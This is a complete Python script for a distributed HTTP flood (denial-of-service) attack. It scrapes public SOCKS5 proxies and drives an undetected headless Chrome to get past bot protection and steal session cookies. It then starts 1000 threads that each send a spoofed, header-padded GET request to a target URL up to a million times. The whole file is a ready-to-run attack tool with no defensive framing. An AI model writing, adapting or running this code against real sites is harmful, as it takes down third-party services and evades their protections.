import requests

import undetected_chromedriver as uc
import ssl
import threading
import socks
from  time import sleep
import random
import platform
import sys
if platform.system() == 'Linux':
    from xvfbwrapper import Xvfb
from socket import (IPPROTO_TCP, TCP_NODELAY)
import time
from urllib.parse import urlparse

def terminate_threads():
    for thread in threading.enumerate():
        if thread is threading.main_thread():
            continue
        thread.join()

def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def browser(url,proxy):
    proxy = f'socks5://{proxy}'
    print(proxy)
    options = uc.ChromeOptions()
    if platform.system() == 'Linux':
        vdisplay = Xvfb(width=800, height=1280)
        vdisplay.start()
        options.add_argument('--no-sandbox')
    if proxyWork == True:
        options.add_argument(f'--proxy-server={proxy}')
    options.add_argument('--allow-running-insecure-content')
    driver = uc.Chrome(options=options)
    driver.get(url)
    sleep(10)
    cookies = driver.get_cookies()
    agent = driver.execute_script("return navigator.userAgent")
    driver.close()
    cookiesForScript = {}
    print(cookies, agent)
    for cookie in cookies:
        cookiesForScript[cookie['name']] = cookie['value']
    return cookiesForScript, agent



def method(proxy,cfcookie,proxyWork,agent,url,timer):
    start_time = time.time()
    end_time = time.time()
    while not stop_threads:
        try:
            target = get_target(url)
            req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
            req += 'Host: ' + target['host'] + '\r\n'
            req += f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9{random.choice(["%00", "%00%00", "%%00%00%00", "%00%00%00%00"])}\r\n'
            req += 'Accept-Encoding: gzip, deflate, br\r\n'
            req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
            req += 'Cache-Control: max-age=0\r\n'
            cookiestring = 'Cookie: '
            for cookie in cfcookie.items():
                cookiestring += cookie[0]+"="+cookie[1]+';'
            req += cookiestring + '\r\n'
            req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
            req += 'sec-ch-ua-mobile: ?0\r\n'
            req += 'sec-ch-ua-platform: "Windows"\r\n'
            req += 'sec-fetch-dest: empty\r\n'
            req += 'sec-fetch-mode: cors\r\n'
            req += 'sec-fetch-site: same-origin\r\n'
            req += 'Connection: Keep-Alive\r\n'
            req += 'X-Originating-IP: 127.0.0.1\r\n'
            req += 'X-Forwarded-For: 127.0.0.1\r\n'
            req += 'X-Remote-IP: 127.0.0.1\r\n'
            req += 'X-Remote-Addr: 127.0.0.1\r\n'
            req += 'X-Client-IP: 127.0.0.1\r\n'
            req += 'X-Host: 127.0.0.1\r\n'
            req += 'X-Forwared-Host: 127.0.0.1\r\n'
            req += 'User-Agent: ' + agent + '\r\n\r\n\r\n'

            if target['scheme'] == 'https':
                packet = socks.socksocket()
                if proxyWork == True:
                    packet.set_proxy(socks.SOCKS5, proxy.split(':')[0], int(proxy.split(':')[1]))
                packet.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                packet.connect((str(target['host']), int(target['port'])))
                ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                packet = ssl_context.wrap_socket(packet, server_hostname=target['host'])
            else:
                packet = socks.socksocket()
                packet.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                packet.connect((str(target['host']), int(target['port'])))

            num = 0

            for _ in range(1000000):
                num += 1
                packet.send(str.encode(req))
                #print(num)
                #response = packet.recv(1024)
                #print(response.decode(encoding='latin-1'))


            #response = packet.recv(1024)
            #packet.close()
            #print(response.decode(encoding='latin-1'))
        except:
            pass

target = sys.argv[1]
timer = int(sys.argv[2])
threadsnum = 1000

if __name__ == '__main__':
    #parseandsaveproxy()
    open('proxy.txt', 'w').write(requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1000&country=all').text.strip().replace('\n', ''))
    stop_threads = False
    while True:
        try:
            proxyWork = True
            proxies = open('proxy.txt').readlines()
            proxy = random.choice(proxies)
            #proxy = '77.90.158.11:50697'
            #print(proxies[0])
            cfcookie, agent = browser(target, proxy)
            if cfcookie == {} or cfcookie == []:
                pass
            else:
                break
        except Exception as e:
            print(e)
    sleep(1)
    for i in range(threadsnum):
        threading.Thread(target=method, args=(proxy,cfcookie,proxyWork,agent,target,timer,)).start()

    start_time = time.time()
    end_time = time.time()
    while (end_time - start_time) < timer:
        end_time = time.time()
        sleep(1)
        print(end_time - start_time)
    stop_threads = True
    print('Start stop threads')
    terminate_threads()
    print('Done')


